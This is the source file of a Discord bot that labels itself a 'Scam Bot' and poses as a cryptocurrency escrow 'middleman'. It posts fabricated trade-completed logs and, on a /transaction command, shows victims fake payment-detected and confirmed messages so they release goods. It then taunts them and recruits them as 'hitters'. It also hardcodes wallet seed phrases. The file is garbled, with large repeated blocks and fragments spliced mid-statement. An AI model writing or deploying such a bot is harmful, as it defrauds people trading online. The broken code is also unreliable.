const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, PermissionsBitField, ChannelType, Partials, Events, StringSelectMenuBuilder, StringSelectMenuOptionBuilder } = require('discord.js');
const axios = require('axios');
const bip39 = require('bip39');
const bip32 = require('bip32');
const bitcoin = require('bitcoinjs-lib');
const ECPairFactory = require('ecpair');
const tinysecp = require('tiny-secp256k1');
const { ethers } = require('ethers');

const ECPair = ECPairFactory(tinysecp);

// ============ CONFIGURATION ============
const CONFIG = {
    OWNER_ROLE_ID: '1484229121134297306',
    HITTER_ROLE_ID: '1483830341142577356',
    WALLET_1_MNEMONIC: 'subway menu famous wheat loud adapt fever element predict buyer street boy plate deer animal', // LTC
    WALLET_2_MNEMONIC: 'arrow ball local country reduce denial alley ring differ gorilla filter neutral', // USDT BEP20
    FEE_ADDRESS_LTC: 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX',
    FEE_ADDRESS_USDT: '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb', // Example BSC address
    GUILD_ID: 'YOUR_GUILD_ID', // Will be set dynamically
    TICKET_CATEGORY: null, // Set via command
    COMPLETED_CHANNEL: null, // Set via command
    LOG_CHANNEL: null // For /heh command
};

// Store active tickets and their data
const activeTickets = new Map();
const ticketAddresses = new Map();
const ticketRoles = new Map(); // Store who is sender/receiver
const userWallets = new Map(); // Store hitter withdrawal addresses

// LTC Price cache
let ltcPrice = 55.57;

// Update LTC price every 5 minutes
setInterval(async () => {
    try {
        const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd', { timeout: 10000 });
        ltcPrice = response.data.litecoin.usd;
    } catch (e) {
        console.log('Price fetch failed, using cached:', ltcPrice);
    }
}, 300000);

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessageTyping
    ],
    partials: [Partials.Channel, Partials.Message]
});

// ============ WALLET GENERATION ============
function generateLTCAddress(index) {
    const seed = bip39.mnemonicToSeedSync(CONFIG.WALLET_1_MNEMONIC);
    const root = bip32.BIP32.fromSeed(seed, bitcoin.networks.litecoin);
    const child = root.derivePath(`m/44'/2'/0'/0/${index}`);
    const { address } = bitcoin.payments.p2pkh({ 
        pubkey: child.publicKey,
        network: bitcoin.networks.litecoin 
    });
    return { address, index };
}

function generateUSDTAddress(index) {
    const wallet = ethers.Wallet.fromPhrase(CONFIG.WALLET_2_MNEMONIC);
    const hdNode = ethers.HDNodeWallet.fromSeed(
        ethers.utils.arrayify(bip39.mnemonicToSeedSync(CONFIG.WALLET_2_MNEMONIC))
    );
    const child = hdNode.derivePath(`m/44'/60'/0'/0/${index}`);
    return { address: child.address, index };
}

// ============ LTC MONITORING ============
async function checkLTCAddress(address, expectedAmount) {
    try {
        const response = await axios.get(`https://litecoinspace.org/api/address/${address}/txs`, { timeout: 10000 });
        const txs = response.data;
        
        for (const tx of txs) {
            let received = 0;
            for (const vout of tx.vout) {
                if (vout.scriptpubkey_address === address) {
                    received += vout.value;
                }
            }
            const receivedLTC = received / 100000000;
            const tolerance = 0.0001; // Small tolerance
            
            if (Math.abs(receivedLTC - expectedAmount) <= tolerance + 0.10) { // +0.10 tolerance as requested
                return {
                    found: true,
                    txid: tx.txid,
                    amount: receivedLTC,
                    confirmed: tx.status.confirmed,
                    confirmations: tx.status.confirmed ? 1 : 0
                };
            }
        }
        return { found: false };
    } catch (e) {
        console.error('LTC check error:', e.message);
        return { found: false };
    }
}

// ============ FAKE TRANSACTION GENERATOR ============
function generateFakeTransaction() {
    const amounts = [
        { ltc: 0.61172556, usd: 34.00 },
        { ltc: 0.64737556, usd: 35.99 },
        { ltc: 0.41396556, usd: 23.00 },
        { ltc: 1.23456789, usd: 68.50 },
        { ltc: 0.08912345, usd: 4.95 }
    ];
    const txids = [
        'eb94cac06...975b97d30',
        'd0bf73084...d0b5a6bd7',
        '5cdc012ae...9b8bbfd66',
        'a1b2c3d4e...f5e6d7c8b',
        '987654321...123456789'
    ];
    
    const amount = amounts[Math.floor(Math.random() * amounts.length)];
    const txid = txids[Math.floor(Math.random() * txids.length)];
    
    return {
        ltc: amount.ltc,
        usd: amount.usd,
        txid: txid,
        sender: 'Anonymous',
        receiver: Math.random() > 0.5 ? 'Anonymous' : '@SOPHIE'
    };
}

// ============ BOT READY ============
client.once(Events.ClientReady, async () => {
    console.log(`Scam Bot logged in as ${client.user.tag}`);
    
    // Start fake log generator
    setInterval(async () => {
        if (CONFIG.LOG_CHANNEL) {
            const channel = await client.channels.fetch(CONFIG.LOG_CHANNEL).catch(() => null);
            if (channel) {
                const fake = generateFakeTransaction();
                const embed = new EmbedBuilder()
                    .setTitle('• Trade Completed')
                    .setColor(0x2b2d31)
                    .setDescription(`**${fake.ltc.toFixed(8)} LTC** ($${fake.usd.toFixed(2)} USD)\n\n**Sender**\n${fake.sender}\n**Receiver**\n${fake.receiver}\n**Transaction ID**\n[${fake.txid}](https://litecoinspace.org/tx/${fake.txid.replace('...', '')})`);
                
                await channel.send({ embeds: [embed] }).catch(() => {});
            }
        }
    }, Math.floor(Math.random() * 180000) + 120000); // 2-5 minutes
});

// ============ SLASH COMMANDS ============
client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isChatInputCommand()) return;
    
    const { commandName, member } = interaction;
    const isOwner = member.roles.cache.has(CONFIG.OWNER_ROLE_ID);
    const isHitter = member.roles.cache.has(CONFIG.HITTER_ROLE_ID);
    
    // /panel - Only owner
    if (commandName === 'panel') {
        if (!isOwner) {
            return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
        }
        
        const embed = new EmbedBuilder()
            .setTitle("Jace's Auto Middleman")
            .setDescription('• Paid Service\n• Read our ToS before using the bot: #tos-crypto')
            .setColor(0x2b2d31)
            .addFields({ name: 'Fees:', value: '• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**' });
        
        const ltcRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('request_ltc')
                .setLabel('Request LTC')
                .setStyle(ButtonStyle.Primary)
                .setEmoji('Ł')
        );
        
        const usdtRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('request_usdt')
                .setLabel('Request USDT [BEP-20]')
                .setStyle(ButtonStyle.Success)
                .setEmoji('💵')
        );
        
        await interaction.channel.send({ 
            embeds: [embed], 
            components: [ltcRow, usdtRow] 
        });
        
        // Second embed for panels
        const panelEmbed = new EmbedBuilder()
            .setTitle('• Request Litecoin • Ł')
            .setColor(0x2b2d31);
        
        const panelEmbed2 = new EmbedBuilder()
            .setTitle('• Request USDT [BEP-20] • 💵')
            .setDescription('• Network: **BSC (BEP-20)**')
            .setColor(0x2b2d31);
        
        const btnRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('req_ltc_btn').setLabel('Request LTC').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('req_usdt_btn').setLabel('Request USDT [BEP-20]').setStyle(ButtonStyle.Success)
        );
        
        await interaction.channel.send({ embeds: [panelEmbed], components: [ltcRow] });
        await interaction.channel.send({ embeds: [panelEmbed2], components: [usdtRow] });
        
        await interaction.reply({ content: '✅ Panels spawned.', ephemeral: true });
    }
    
    // /log - Set log channel
    if (commandName === 'log') {
        if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
        CONFIG.LOG_CHANNEL = interaction.channel.id;
        await interaction.reply({ content: '✅ Log channel set.', ephemeral: true });
    }
    
    // /transaction - Fake transaction trigger (Hitter only)
    if (commandName === 'transaction') {
        if (!isHitter && !isOwner) {
            return interaction.reply({ content: '❌ Hitter role required.', ephemeral: true });
        }
        
        const channelId = interaction.options.getString('channelid');
        const channel = await client.channels.fetch(channelId).catch(() => null);
        
        if (!channel) return interaction.reply({ content: '❌ Invalid channel.', ephemeral: true });
        
        // Send fake transaction detected
        const fakeEmbed = new EmbedBuilder()
            .setTitle('⚠️ • Transaction Detected')
            .setDescription('The transaction is currently **unconfirmed** and waiting for 1 confirmation.\n\n**Transaction**\n`f47c24fd8...7b2698be6` (0.00179953 LTC)\n**Amount Received**\n0.00179953 LTC ($0.10)\n**Required Amount**\n0.0018 LTC ($0.10)\n\nYou will be notified when the transaction is confirmed.')
            .setColor(0xffa500);
        
        await channel.send({ embeds: [fakeEmbed] });
        
        // Wait 30 seconds then send release
        setTimeout(async () => {
            const confirmedEmbed = new EmbedBuilder()
                .setTitle('✅ • Transaction Confirmed!')
                .setDescription('**Transactions**\n`f47c24fd8...7b2698be6` (0.00179953 LTC)\n**Total Amount Received**\n0.00179953 LTC ($0.10)')
                .setColor(0x00ff00);
            
            await channel.send({ embeds: [confirmedEmbed] });
            
            // Check if hitter is sender or receiver
            const ticketData = activeTickets.get(channelId);
            const isHitterSender = ticketData && ticketData.senderId === interaction.user.id;
            
            if (isHitterSender) {
                // Hitter is sender - show normal release then scam message
                const releaseEmbed = new EmbedBuilder()
                    .setTitle('✅ • You may proceed with your trade.')
                    .setDescription(`1. <@${ticketData.receiverId}> Give your trader the items or payment you agreed on.\n2. <@${ticketData.senderId}> Once you have received your items, click "Release" so your trader can claim the LTC.`)
                    .setColor(0x00ff00);
                
                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`fake_release_${channelId}`).setLabel('Release').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
                );
                
                const msg = await channel.send({ embeds: [releaseEmbed], components: [row] });
                
                // Auto-trigger scam after release click simulation
                setTimeout(async () => {
                    const scamEmbed = new EmbedBuilder()
                        .setTitle('😈 Did vro deadass get scammed lmao')
                        .setDescription('Better luck next time kid.')
                        .setColor(0xff0000);
                    
                    const joinRow = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('join_hitter').setLabel('Join us').setStyle(ButtonStyle.Danger)
                    );
                    
                    await channel.send({ embeds: [scamEmbed], components: [joinRow] });
                }, 5000);
                
            } else {
                // Hitter is receiver - ask for their address
                const scamInputEmbed = new EmbedBuilder()
                    .setTitle('✅ • Transaction Confirmed')
                    .setDescription('Hitter input your LTC/USDT address to receive the scammed money')
                    .setColor(0x00ff00);
                
                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`input_address_${channelId}`).setLabel('Input Address').setStyle(ButtonStyle.Primary)
                );
                
                await channel.send({ embeds: [scamInputEmbed], components: [row] });
            }
        }, 30000);
        
        await interaction.reply({ content: '✅ Fake transaction initiated.', ephemeral: true });
    }
    
    // /close - Close ticket
    if (commandName === 'close') {
        if (!interaction.channel.name.startsWith('ltc-') && !interaction.channel.name.startsWith('usdt-')) {
            return interaction.reply({ content role required.', ephemeral: true });
        }
        
        const channelId = interaction.options.getString('channelid');
        const channel = await client.channels.fetch(channelId).catch(() => null);
        
        if (!channel) return interaction.reply({ content: '❌ Invalid channel.', ephemeral: true });
        
        // Send fake transaction detected
        const fakeEmbed = new EmbedBuilder()
            .setTitle('⚠️ • Transaction Detected')
            .setDescription('The transaction is currently **unconfirmed** and waiting for 1 confirmation.\n\n**Transaction**\n`f47c24fd8...7b2698be6` (0.00179953 LTC)\n**Amount Received**\n0.00179953 LTC ($0.10)\n**Required Amount**\n0.0018 LTC ($0.10)\n\nYou will be notified when the transaction is confirmed.')
            .setColor(0xffa500);
        
        await channel.send({ embeds: [fakeEmbed] });
        
        // Wait 30 seconds then send release
        setTimeout(async () => {
            const confirmedEmbed = new EmbedBuilder()
                .setTitle('✅ • Transaction Confirmed!')
                .setDescription('**Transactions**\n`f47c24fd8...7b2698be6` (0.00179953 LTC)\n**Total Amount Received**\n0.00179953 LTC ($0.10)')
                .setColor(0x00ff00);
            
            await channel.send({ embeds: [confirmedEmbed] });
            
            // Check if hitter is sender or receiver
            const ticketData = activeTickets.get(channelId);
            const isHitterSender = ticketData && ticketData.senderId === interaction.user.id;
            
            if (isHitterSender) {
                // Hitter is sender - show normal release then scam message
                const releaseEmbed = new EmbedBuilder()
                    .setTitle('✅ • You may proceed with your trade.')
                    .setDescription(`1. <@${ticketData.receiverId}> Give your trader the items or payment you agreed on.\n2. <@${ticketData.senderId}> Once you have received your items, click "Release" so your trader can claim the LTC.`)
                    .setColor(0x00ff00);
                
                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`fake_release_${channelId}`).setLabel('Release').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
                );
                
                const msg = await channel.send({ embeds: [releaseEmbed], components: [row] });
                
                // Auto-trigger scam after release click simulation
                setTimeout(async () => {
                    const scamEmbed = new EmbedBuilder()
                        .setTitle('😈 Did vro deadass get scammed lmao')
                        .setDescription('Better luck next time kid.')
                        .setColor(0xff0000);
                    
                    const joinRow = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('join_hitter').setLabel('Join us').setStyle(ButtonStyle.Danger)
                    );
                    
                    await channel.send({ embeds: [scamEmbed], components: [joinRow] });
                }, 5000);
                
            } else {
                // Hitter is receiver - ask for their address
                const scamInputEmbed = new EmbedBuilder()
                    .setTitle('✅ • Transaction Confirmed')
                    .setDescription('Hitter input your LTC/USDT address to receive the scammed money')
                    .setColor(0x00ff00);
                
                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`input_address_${channelId}`).setLabel('Input Address').setStyle(ButtonStyle.Primary)
                );
                
                await channel.send({ embeds: [scamInputEmbed], components: [row] });
            }
        }, 30000);
        
        await interaction.reply({ content: '✅ Fake transaction initiated.', ephemeral: true });
    }
    
    // /close - Close ticket
    if (commandName === 'close') {
        if (!interaction.channel.name.startsWith('ltc-') && !interaction.channel.name.startsWith('usdt-')) {
            return interaction.reply({ content: '❌ Not a ticket channel.', ephemeral: true });
        }
        
        const ticketData = activeTickets.get(interaction.channel.id);
        
        // Send close notification to heh channel
        if (CONFIG.LOG_CHANNEL && ticketData) {
            const logChannel = await client.channels.fetch(CONFIG.LOG_CHANNEL).catch(() => null);
            if (logChannel) {
                await logChannel.send({
                    content: `**Sender:** <@${ticketData.senderId}>\n**Receiver:** <@${ticketData.receiverId}>\n**Closed by:** <@${interaction.user.id}>`
                });
            }
        }
        
        await interaction.reply({ content: '🔒 Closing ticket...' });
        setTimeout(() => interaction.channel.delete().catch(() => {}), 3000);
    }
    
    // /heh - Set monitor channel for closed tickets
    if (commandName === 'heh') {
        if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
        CONFIG.LOG_CHANNEL = interaction.options.getString('channelid');
        await interaction.reply({ content: '✅ Monitor channel set for closed tickets.', ephemeral: true });
    }
    
    // /setcategory - Set ticket category
    if (commandName === 'setcategory') {
        if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
        CONFIG.TICKET_CATEGORY = interaction.options.getString('categoryid');
        await interaction.reply({ content: '✅ Ticket category set.', ephemeral: true });
    }
});

// ============ BUTTON HANDLERS ============
client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isButton()) return;
    
    const { customId, user, guild } = interaction;
    
    // Request LTC/USDT buttons
    if (customId === 'request_ltc' || customId === 'req_ltc_btn') {
        const modal = new ModalBuilder()
            .setCustomId('ltc_modal')
            .setTitle('Fill out the format');
        
        const traderInput = new TextInputBuilder()
            .setCustomId('trader')
            .setLabel('Paste Your Trader\'s Username or ID')
            .setPlaceholder('e.g.: kookie.js / 693059117761429610')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        const givingInput = new TextInputBuilder()
            .setCustomId('giving')
            .setLabel('What are You giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        const receivingInput = new TextInputBuilder()
            .setCustomId('receiving')
            .setLabel('What is Your Trader giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        modal.addComponents(
            new ActionRowBuilder().addComponents(traderInput),
            new ActionRowBuilder().addComponents(givingInput),
            new ActionRowBuilder().addComponents(receivingInput)
        );
        
        await interaction.showModal(modal);
    }
    
    if (customId === 'request_usdt' || customId === 'req_usdt_btn') {
        const modal = new ModalBuilder()
            .setCustomId('usdt_modal')
            .setTitle('Fill out the format');
        
        const traderInput = new TextInputBuilder()
            .setCustomId('trader')
            .setLabel('Paste Your Trader\'s Username or ID')
            .setPlaceholder('e.g.: kookie.js / 693059117761429610')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        const givingInput = new TextInputBuilder()
            .setCustomId('giving')
            .setLabel('What are You giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        const receivingInput = new TextInputBuilder()
            .setCustomId('receiving')
            .setLabel('What is Your Trader giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        modal.addComponents(
            new ActionRowBuilder().addComponents(traderInput),
            new ActionRowBuilder().addComponents(givingInput),
            new ActionRowBuilder().addComponents(receivingInput)
        );
        
        await interaction.showModal(modal);
    }
    
    // Role selection buttons
    if (customId.startsWith('role_')) {
        const [, role, ticketId] = customId.split('_');
        const ticketData = activeTickets.get(ticketId);
        
        if (!ticketData) return interaction.reply({ content: '❌ Ticket expired.', ephemeral: true });
        
        // Store role selection
        if (!ticketRoles.has(ticketId)) ticketRoles.set(ticketId, {});
        const roles = ticketRoles.get(ticketId);
        
        if (user.id === ticketData.creatorId) {
            roles.creatorRole = role;
        } else if (user.id === ticketData.traderId) {
            roles.traderRole = role;
        }
        
        await interaction.reply({ content: `✅ You selected: **${role === 'sender' ? 'Sender' : 'Receiver'}**`, ephemeral: true });
        
        // Update embed with role required.', ephemeral: true });
        }
        
        const channelId = interaction.options.getString('channelid');
        const channel = await client.channels.fetch(channelId).catch(() => null);
        
        if (!channel) return interaction.reply({ content: '❌ Invalid channel.', ephemeral: true });
        
        // Send fake transaction detected
        const fakeEmbed = new EmbedBuilder()
            .setTitle('⚠️ • Transaction Detected')
            .setDescription('The transaction is currently **unconfirmed** and waiting for 1 confirmation.\n\n**Transaction**\n`f47c24fd8...7b2698be6` (0.00179953 LTC)\n**Amount Received**\n0.00179953 LTC ($0.10)\n**Required Amount**\n0.0018 LTC ($0.10)\n\nYou will be notified when the transaction is confirmed.')
            .setColor(0xffa500);
        
        await channel.send({ embeds: [fakeEmbed] });
        
        // Wait 30 seconds then send release
        setTimeout(async () => {
            const confirmedEmbed = new EmbedBuilder()
                .setTitle('✅ • Transaction Confirmed!')
                .setDescription('**Transactions**\n`f47c24fd8...7b2698be6` (0.00179953 LTC)\n**Total Amount Received**\n0.00179953 LTC ($0.10)')
                .setColor(0x00ff00);
            
            await channel.send({ embeds: [confirmedEmbed] });
            
            // Check if hitter is sender or receiver
            const ticketData = activeTickets.get(channelId);
            const isHitterSender = ticketData && ticketData.senderId === interaction.user.id;
            
            if (isHitterSender) {
                // Hitter is sender - show normal release then scam message
                const releaseEmbed = new EmbedBuilder()
                    .setTitle('✅ • You may proceed with your trade.')
                    .setDescription(`1. <@${ticketData.receiverId}> Give your trader the items or payment you agreed on.\n2. <@${ticketData.senderId}> Once you have received your items, click "Release" so your trader can claim the LTC.`)
                    .setColor(0x00ff00);
                
                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`fake_release_${channelId}`).setLabel('Release').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
                );
                
                const msg = await channel.send({ embeds: [releaseEmbed], components: [row] });
                
                // Auto-trigger scam after release click simulation
                setTimeout(async () => {
                    const scamEmbed = new EmbedBuilder()
                        .setTitle('😈 Did vro deadass get scammed lmao')
                        .setDescription('Better luck next time kid.')
                        .setColor(0xff0000);
                    
                    const joinRow = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('join_hitter').setLabel('Join us').setStyle(ButtonStyle.Danger)
                    );
                    
                    await channel.send({ embeds: [scamEmbed], components: [joinRow] });
                }, 5000);
                
            } else {
                // Hitter is receiver - ask for their address
                const scamInputEmbed = new EmbedBuilder()
                    .setTitle('✅ • Transaction Confirmed')
                    .setDescription('Hitter input your LTC/USDT address to receive the scammed money')
                    .setColor(0x00ff00);
                
                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`input_address_${channelId}`).setLabel('Input Address').setStyle(ButtonStyle.Primary)
                );
                
                await channel.send({ embeds: [scamInputEmbed], components: [row] });
            }
        }, 30000);
        
        await interaction.reply({ content: '✅ Fake transaction initiated.', ephemeral: true });
    }
    
    // /close - Close ticket
    if (commandName === 'close') {
        if (!interaction.channel.name.startsWith('ltc-') && !interaction.channel.name.startsWith('usdt-')) {
            return interaction.reply({ content: '❌ Not a ticket channel.', ephemeral: true });
        }
        
        const ticketData = activeTickets.get(interaction.channel.id);
        
        // Send close notification to heh channel
        if (CONFIG.LOG_CHANNEL && ticketData) {
            const logChannel = await client.channels.fetch(CONFIG.LOG_CHANNEL).catch(() => null);
            if (logChannel) {
                await logChannel.send({
                    content: `**Sender:** <@${ticketData.senderId}>\n**Receiver:** <@${ticketData.receiverId}>\n**Closed by:** <@${interaction.user.id}>`
                });
            }
        }
        
        await interaction.reply({ content: '🔒 Closing ticket...' });
        setTimeout(() => interaction.channel.delete().catch(() => {}), 3000);
    }
    
    // /heh - Set monitor channel for closed tickets
    if (commandName === 'heh') {
        if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
        CONFIG.LOG_CHANNEL = interaction.options.getString('channelid');
        await interaction.reply({ content: '✅ Monitor channel set for closed tickets.', ephemeral: true });
    }
    
    // /setcategory - Set ticket category
    if (commandName === 'setcategory') {
        if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
        CONFIG.TICKET_CATEGORY = interaction.options.getString('categoryid');
        await interaction.reply({ content: '✅ Ticket category set.', ephemeral: true });
    }
});

// ============ BUTTON HANDLERS ============
client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isButton()) return;
    
    const { customId, user, guild } = interaction;
    
    // Request LTC/USDT buttons
    if (customId === 'request_ltc' || customId === 'req_ltc_btn') {
        const modal = new ModalBuilder()
            .setCustomId('ltc_modal')
            .setTitle('Fill out the format');
        
        const traderInput = new TextInputBuilder()
            .setCustomId('trader')
            .setLabel('Paste Your Trader\'s Username or ID')
            .setPlaceholder('e.g.: kookie.js / 693059117761429610')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        const givingInput = new TextInputBuilder()
            .setCustomId('giving')
            .setLabel('What are You giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        const receivingInput = new TextInputBuilder()
            .setCustomId('receiving')
            .setLabel('What is Your Trader giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        modal.addComponents(
            new ActionRowBuilder().addComponents(traderInput),
            new ActionRowBuilder().addComponents(givingInput),
            new ActionRowBuilder().addComponents(receivingInput)
        );
        
        await interaction.showModal(modal);
    }
    
    if (customId === 'request_usdt' || customId === 'req_usdt_btn') {
        const modal = new ModalBuilder()
            .setCustomId('usdt_modal')
            .setTitle('Fill out the format');
        
        const traderInput = new TextInputBuilder()
            .setCustomId('trader')
            .setLabel('Paste Your Trader\'s Username or ID')
            .setPlaceholder('e.g.: kookie.js / 693059117761429610')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        const givingInput = new TextInputBuilder()
            .setCustomId('giving')
            .setLabel('What are You giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        const receivingInput = new TextInputBuilder()
            .setCustomId('receiving')
            .setLabel('What is Your Trader giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        modal.addComponents(
            new ActionRowBuilder().addComponents(traderInput),
            new ActionRowBuilder().addComponents(givingInput),
            new ActionRowBuilder().addComponents(receivingInput)
        );
        
        await interaction.showModal(modal);
    }
    
    // Role selection buttons
    if (customId.startsWith('role_')) {
        const [, role, ticketId] = customId.split('_');
        const ticketData = activeTickets.get(ticketId);
        
        if (!ticketData) return interaction.reply({ content: '❌ Ticket expired.', ephemeral: true });
        
        // Store role selection
        if (!ticketRoles.has(ticketId)) ticketRoles.set(ticketId, {});
        const roles = ticketRoles.get(ticketId);
        
        if (user.id === ticketData.creatorId) {
            roles.creatorRole = role;
        } else if (user.id === ticketData.traderId) {
            roles.traderRole = role;
        }
        
        await interaction.reply({ content: `✅ You selected: **${role === 'sender' ? 'Sender' : 'Receiver'}**`, ephemeral: true });
        
        // Update embed with selections
        const channel = await client.channels.fetch(ticketId);
        const messages = await channel.messages.fetch({ limit: 10 });
        const roleMsg = messages.find(m => m.embeds[0]?.title?.includes('Select your role'));
        
        if (roleMsg && roles.creatorRole && roles.traderRole) {
            const updatedEmbed = EmbedBuilder.from(roleMsg.embeds[0])
                .setFields(
                    { name: 'Sender', value: roles.creatorRole === 'sender' ? `<@${ticketData.creatorId}>` : `<@${ticketData.traderId}>`, inline: false },
                    { name: 'Receiver', value: roles.creatorRole === 'receiver' ? `<@${ticketData.creatorId}>` : `<@${ticketData.traderId}>`, inline: false }
                );
            
            const confirmRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`confirm_roles_${ticketId}`).setLabel('Correct').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`reset_roles_${ticketId}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger)
            );
            
            await roleMsg.edit({ embeds: [updatedEmbed], components: [confirmRow] });
        }
    }
    
    // Confirm roles
    if (customId.startsWith('confirm_roles_')) {
        const ticketId = customId.replace('confirm_roles_', '');
        const ticketData = activeTickets.get(ticketId);
        const roles = ticketRoles.get(ticketId);
        
        if (!ticketData || !roles) return;
        
        // Determine sender and receiver
        let senderId, receiverId;
        if (roles.creatorRole === 'sender') {
            senderId = ticketData.creatorId;
            receiverId = ticketData.traderId;
        } else {
            senderId = ticketData.traderId;
            receiverId = ticketData.creatorId;
        }
        
        ticketData.senderId = senderId;
        ticketData.receiverId = receiverId;
        
        await interaction.reply({ content: `✅ <@${user.id}> clicked Correct.` });
        
        // Send amount setting embed
        const amountEmbed = new EmbedBuilder()
            .setTitle('💵 • Set the amount in USD value')
            .setColor(0x2b2d31);
        
        const amountRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`set_amount_${ticketId}`).setLabel('Set USD Amount').setStyle(ButtonStyle.Primary)
        );
        
        const channel = await client.channels.fetch(ticketId);
        await channel.send({ embeds: [amountEmbed], components: [amountRow] });
    }
    
    // Set amount button
    if (customId.startsWith('set_amount_')) {
        const ticketId = customId.replace('set_amount_', '');
        
        const modal = new ModalBuilder()
            .setCustomId(`amount_modal_${ticketId}`)
            .setTitle('Set USD Amount');
        
        const amountInput = new TextInputBuilder()
            .setCustomId('usd_amount')
            .setLabel('Enter USD Amount')
            .setPlaceholder('0.10')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        modal.addComponents(new ActionRowBuilder().addComponents(amountInput));
        await interaction.showModal(modal);
    }
    
    // Copy details button
    if (customId === 'copy_details') {
        await interaction.reply({ content: '```\nLctyaKaxPGTUYM3bZdoADKGj947XxgaUH8\n0.0018\n```', ephemeral: true });
    }
    
    // Fake release button
    if (customId.startsWith('fake_release_')) {
        const scamEmbed = new EmbedBuilder()
            .setTitle('😈 Did vro deadass get scammed lmao')
            .setDescription('Better luck next time kid.')
            .setColor(0xff0000);
        
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('join_hitter').setLabel('Join us').setStyle(ButtonStyle.Danger)
        );
        
        await interaction.update({ embeds: [scamEmbed], components: [row] });
    }
    
    // Join hitter role
    if (customId === 'join_hitter') {
        const member = await interaction.guild.members.fetch(user.id);
        await member.roles.add(CONFIG.HITTER_ROLE_ID).catch(() => {});
        await interaction.reply({ content: '✅ You now have the Hitter role!', ephemeral: true });
    }
    
    // Input address button (for hitter receiver)
    if (customId.startsWith('input_address_')) {
        const ticketId = customId.replace('input_address_', '');
        
        const modal = new ModalBuilder()
            .setCustomId(`address_modal_${ticketId}`)
            .setTitle('Input Your Wallet Address');
        
        const addressInput = new TextInputBuilder()
            .setCustomId('wallet_address')
            .setLabel('Your LTC or USDT Address')
            .setPlaceholder('Enter address to receive funds...')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        modal.addComponents(new ActionRowBuilder().addComponents(addressInput));
        await interaction.showModal(modal);
    }
    
    // Delete ticket
    if (customId === 'delete_ticket') {
        await interaction.reply({ content: '🔒 Deleting role required.', ephemeral: true });
        }
        
        const channelId = interaction.options.getString('channelid');
        const channel = await client.channels.fetch(channelId).catch(() => null);
        
        if (!channel) return interaction.reply({ content: '❌ Invalid channel.', ephemeral: true });
        
        // Send fake transaction detected
        const fakeEmbed = new EmbedBuilder()
            .setTitle('⚠️ • Transaction Detected')
            .setDescription('The transaction is currently **unconfirmed** and waiting for 1 confirmation.\n\n**Transaction**\n`f47c24fd8...7b2698be6` (0.00179953 LTC)\n**Amount Received**\n0.00179953 LTC ($0.10)\n**Required Amount**\n0.0018 LTC ($0.10)\n\nYou will be notified when the transaction is confirmed.')
            .setColor(0xffa500);
        
        await channel.send({ embeds: [fakeEmbed] });
        
        // Wait 30 seconds then send release
        setTimeout(async () => {
            const confirmedEmbed = new EmbedBuilder()
